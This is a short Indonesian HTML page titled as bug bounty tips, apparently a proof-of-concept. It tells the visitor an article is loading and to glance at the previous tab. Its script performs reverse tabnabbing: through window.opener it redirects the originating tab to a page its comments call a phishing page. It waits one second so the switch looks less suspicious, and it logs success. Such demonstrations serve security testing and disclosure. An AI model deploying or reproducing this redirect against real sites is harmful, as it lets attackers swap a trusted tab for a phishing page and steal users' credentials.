<body>
    <h1>Tips Jago Bug Bounty</h1>
    <p>Artikel sedang dimuat... Silakan baca tab sebelumnya sebentar.</p>

    <script>
        // Cek akses ke jendela yang membuka halaman ini
        if (window.opener) {
            // Tunggu 1 detik agar perpindahan tidak terlalu mencurigakan
            setTimeout(function() {
                // Ganti lokasi tab asal ke halaman phishing (alert.html)
                window.opener.location = "alert.html";
                console.log("Tab asal berhasil diarahkan ke alert.html");
            }, 1000);
        } else {
            document.body.innerHTML += "<p style='color:red;'>Gagal: window.opener tidak ditemukan.</p>";
        }
    </script>
